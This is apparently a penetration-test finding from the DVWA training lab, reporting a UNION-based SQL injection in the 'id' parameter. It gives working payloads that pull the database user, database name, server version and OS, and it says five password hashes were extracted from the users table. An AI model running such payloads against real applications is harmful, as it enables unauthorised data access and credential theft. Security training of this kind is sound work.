title: SQL Injection (UNION-based) in id parameter - /vulnerabilities/sqli/
proof: id=1' UNION SELECT user(),database()-- - returns First name: app@localhost, Surname: dvwa. id=1' UNION SELECT version(),@@version_compile_os-- - returns First name: 10.1.26-MariaDB-0+deb9u1, Surname: debian-linux-gnu. Extracted 5 user password hashes via UNION SELECT user,password FROM users.
